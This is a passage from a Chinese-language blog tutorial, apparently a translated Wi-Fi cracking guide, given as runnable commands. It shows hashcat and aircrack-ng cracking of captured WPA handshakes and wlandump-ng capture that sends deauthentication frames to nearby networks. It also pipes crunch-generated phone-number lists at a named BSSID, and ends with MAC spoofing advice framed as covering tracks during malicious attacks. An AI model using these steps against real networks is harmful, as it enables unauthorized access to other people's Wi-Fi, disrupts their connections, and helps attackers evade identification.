class=\"built_in\">clone</span> https://github.com/brannondorsey/naive-hashcat</span><br><span class=\"line\"><span class=\"built_in\">cd</span> naive-hashcat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 MacOS/OSX 上从原代码构建程序</span></span><br><span class=\"line\">./build-hashcat-osx.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下载 134MB rockyou字典文件</span></span><br><span class=\"line\">curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p>最后，运行 <code>naive-hashcat.sh</code>。将 <code>handshake.hccapx</code> 名称改成你从 <a href=\"https://hashcat.net/cap2hccapx/\" target=\"_blank\">hashcat.net</a> 下载的文件名称。<code>cracked.pot</code>是输出文件名称。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HASH_FILE&#x3D;handshake.hccapx POT_FILE&#x3D;cracked.pot HASH_TYPE&#x3D;2500 .&#x2F;naive-hashcat.sh</span><br></pre></td></tr></table></figure>\n\n<p>再次感谢 <a href=\"https://github.com/harshpatel991\" target=\"_blank\">@harshpatel991</a>，以及 <a href=\"http://www.phillips321.co.uk/\" target=\"_blank\">phillips321</a> 关于如何在 OSX 上构建 hashcat 的<a href=\"https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/\" target=\"_blank\">帖子</a>。</p>\n<h2 id=\"使用-wlandump-ng-抓取-handshake\">使用 <code>wlandump-ng</code> 抓取 handshake<a href=\"#使用-wlandump-ng-抓取-handshake\" title=\"使用 wlandump-ng 抓取 handshake\"></a></h2><p><a href=\"https://github.com/enilfodne\" target=\"_blank\">@enilfodne</a> 提到 hachcat 社区有一个<a href=\"https://github.com/brannondorsey/wifi-cracking/issues/15\" target=\"_blank\">更棒的工具</a>可以抓取 WPA 的 4-way handshakes。它是 hashcat 工具包的一部分，叫 <a href=\"https://github.com/ZerBea/hcxtools\" target=\"_blank\">hcxtools</a> ，由 <a href=\"https://github.com/ZerBea\" target=\"_blank\">ZerBea</a> 开发，名声已经超过了 <code>airdump-ng</code>。<code>wlandump-ng</code> 允许你一次性从每个附近的网络上全面抓取 handshake 信息，跳过 Wi-Fi 信道，以增加收集。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 hcxtools</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ZerBea/hcxtools</span><br><span class=\"line\"><span class=\"built_in\">cd</span> hcxtools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 构建并且安装</span></span><br><span class=\"line\"><span class=\"comment\"># 你将可能需要apt来安装需要的依赖</span></span><br><span class=\"line\"><span class=\"comment\"># https://github.com/ZerBea/hcxtools#requirements</span></span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接</span></span><br><span class=\"line\"><span class=\"comment\"># 将wlan0替换成你的无线设备名称</span></span><br><span class=\"line\">wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 一旦你获得了抓取的文件，你可以利用以下命令将其转换成hashcat抓取格式</span></span><br><span class=\"line\">cap2hccapx.bin capture.cap capture.hccapx</span><br></pre></td></tr></table></figure>\n\n<p><code>wlandump-ng</code> 命令行参数（使用 <code>h</code> 标志来获得完整列表）：</p>\n<ul><li><code>-c 1</code>：从通道 1 开始的 2.4Ghz 范围（将转到13）</li>\n<li><code>-t 60</code>：每个通道停留 60s（实验值较低，默认值为 5）</li>\n<li><code>-d 100</code>：发送 deauth 每 100 个信标帧</li>\n<li><code>-D 10</code>：每隔 10 个信标帧发送解析数据包</li>\n<li><code>-m 512</code>：内部缓冲区大小，对于低资源机器使用 512</li>\n<li><code>-b</code>：激活信号到最后 10 个探测请求</li>\n<li><code>-r</code>：如果循环在通道 1 上，则重置 deauthentication / detachosciation 计数器</li>\n<li><code>-s 20</code>：显示 20 条状态行</li>\n</ul><p><strong>警告：</strong> 在大多数地方使用这个是不合法的。更多信息请参考<a href=\"https://github.com/ZerBea/hcxtools#warning\" target=\"_blank\">这里</a>。</p>\n<p><code>wlandump-ng</code> 也提供了在被动模式下运行的选项，这时不会发送任何 deauth/disassociation 数据帧。 如果担心会影响到周围人使用网络（你应该是）时建议你使用这种模式。代价是你获得的 handshake 会少得多，不过用这种方法抓取不会被人察觉。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在被动模式下使用默认设置运行</span></span><br><span class=\"line\">wlandump-ng -i wlan0 -o capture.cap -p -s 20</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用-crunch-生成单词列表\">使用 <code>crunch</code> 生成单词列表<a href=\"#使用-crunch-生成单词列表\" title=\"使用 crunch 生成单词列表\"></a></h2><p><code>crunch</code> 是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用 crunch 来即时生成密码列表，再通过管道传递给 <code>aircrack-ng</code> 而不必将单词列表保存到磁盘。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装crunch</span></span><br><span class=\"line\">sudo apt-get install crunch</span><br></pre></td></tr></table></figure>\n\n<p>要想知道如何运行 crunch，可以从命令行运行（一旦开始发送密码，就可以按 <code>ctrl-c</code>）：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 语法 8 8 是生成密码的最小长度和最大长度</span></span><br><span class=\"line\"><span class=\"comment\"># 01234567890 是组合/排列构成密码的一组字符</span></span><br><span class=\"line\">crunch 8 8 0123456789</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Crunch 现在将生成以下数据量：900000000字节</span><br><span class=\"line\">858 MB</span><br><span class=\"line\">0 GB</span><br><span class=\"line\">0 TB</span><br><span class=\"line\">0 PB</span><br><span class=\"line\">Crunch 现在将生成以下行数：100000000</span><br><span class=\"line\">00000000</span><br><span class=\"line\">00000001</span><br><span class=\"line\">00000002</span><br><span class=\"line\">00000003</span><br><span class=\"line\">00000004</span><br><span class=\"line\">00000005</span><br><span class=\"line\">00000006</span><br><span class=\"line\">00000007</span><br><span class=\"line\">00000008</span><br><span class=\"line\">00000009</span><br><span class=\"line\">...</span><br><span class=\"line\">99999999</span><br></pre></td></tr></table></figure>\n\n<p>我们可以将 <code>crunch</code> 的输出作为 <code>aircrack-ng</code> 的输入，使用它生成的密码作为我们的单词列表。 这里我们使用 <code>crunch</code> 特殊规则字符 <code>%</code> 来表示数字。 此命令尝试破解10位电话号码的 WPA 密码（使用 crunch 即时生成的 102GB 的号码）：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 我们也可以使用 -t \"@^%,\"  使用模式 '@' 替换小写 ',' － 替换大写</span></span><br><span class=\"line\"><span class=\"comment\"># '%' －替换数字以及 '^' － 替换特殊字符</span></span><br><span class=\"line\"><span class=\"comment\"># *************** 不要忘记最后的 '-'</span></span><br><span class=\"line\">crunch 10 10 -t <span class=\"string\">\"%%%%%%%%%%\"</span> | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"利用-macchanger-保护你的个人信息\">利用 <code>macchanger</code> 保护你的个人信息<a href=\"#利用-macchanger-保护你的个人信息\" title=\"利用 macchanger 保护你的个人信息\"></a></h2><p>每当您使用 Wi-Fi 进行任何远程恶意攻击时，最好将你 Wi-Fi 设备的 MAC 地址进行伪装，避免被人通过网络流量里的设备信息找到你。</p>\n<p>这是利用 <code>macchanger</code> 的一个小尝试：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载 MAC changer</span></span><br><span class=\"line\">sudo apt-get install macchanger</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 关闭设备</span></span><br><span class=\"line\">sudo ifconfig wlan0 down</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 改变 mac</span></span><br><span class=\"line\"><span class=\"comment\"># -A 为有效的供应商分配一个随机的MAC w/a</span></span><br><span class=\"line\"><span class=\"comment\"># -r 让它真正随机</span></span><br><span class=\"line\"><span class=\"comment\"># -p 将其恢复到原始的硬件MAC</span></span><br><span class=\"line\">sudo macchanger -A wlan0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动设备</span></span><br><span class=\"line\">sudo ifconfig wlan0 up</span><br></pre></td></tr></table></figure>\n\n<p>如果你有多张无线网卡，最好把所有的设备都改一遍。 或者当你尝试抓取 handshake 时干脆把不用的设备都关掉，尽可能少地留下痕迹。 请注意，重启后伪装的设备信息会恢复。</p>\n","prev":{"title":"一个极简的HTTP Server： Caddy一键安装脚本，带网站配置教程","link":"2020/01/27/caddy-install"},"next":{"title":"使用 Go 语言实现一个云剪切板（未开始）","link":"2019/11/22/yong-go-shi-xian-yi-ge-yun-jian-qie-ban"},"plink":"https://gwliang.com/2020/01/24/wifi-cracking/","toc":[{"id":"wi-fi-破解","title":"Wi-Fi 破解","index":"1","children":[{"id":"入门","title":"入门","index":"1.1"},{"id":"破解一个wi-fi网络","title":"破解一个WI-FI网络","index":"1.2","children":[{"id":"监测模式-monitor-mode","title":"监测模式 (Monitor Mode)","index":"1.2.1"},{"id":"找到你的目标","title":"找到你的目标","index":"1.2.2"},{"id":"捕获-4-way-handshake","title":"捕获 4-way Handshake","index":"1.2.3"},{"id":"破解网络密码","title":"破解网络密码","index":"1.2.4"}]},{"id":"deauth-attack","title":"Deauth Attack","index":"1.3"},{"id":"命令列表","title":"命令列表","index":"1.4"},{"id":"附录","title":"附录","index":"1.5"},{"id":"致谢","title":"致谢","index":"1.6"}]},{"id":"附录a","title":"附录A","index":"2","children":[{"id":"在-macososx-上破解-wi-fi","title":"在 MacOS&#x2F;OSX 上破解 WI-FI","index":"2.1","children":[{"id":"无线诊断工具","title":"无线诊断工具","index":"2.1.1"},{"id":"测定目标网络信道","title":"测定目标网络信道","index":"2.1.2"},{"id":"抓取一个-4-way-handshake","title":"抓取一个 4-way handshake","index":"2.1.3"},{"id":"利用-naive-hashcat-破解密码","title":"利用 naive-hashcat 破解密码","index":"2.1.4"}]},{"id":"使用-wlandump-ng-抓取-handshake","title":"使用 wlandump-ng 抓取 handshake","index":"2.2"},{"id":"使用-crunch-生成单词列表","title":"使用 crunch 生成单词列表","index":"2.3"},{"id":"利用-macchanger-保护你的个人信息","title":"利用 macchanger 保护你的个人信息","index":"2.4"}]}],"reward":true,"copyright":{"license":"自由转载-非商用-禁止演绎-保持署名(<a href=\\\"https://creativecommons.org/licenses/by-nc-sa/4.0/\\\" rel=\\\"external nofollow\\\" target=\\\"_blank\\\">CC BY-NC-ND 4.0</a>)","author":"Gaowan Liang","link":"<a href=\"https://gwliang.com/2020/01/24/wifi-cracking/\" title=\"Wi-Fi 等无线网络安全审计方法\">https://gwliang.com/2020/01/24/wifi-cracking/</a>"}}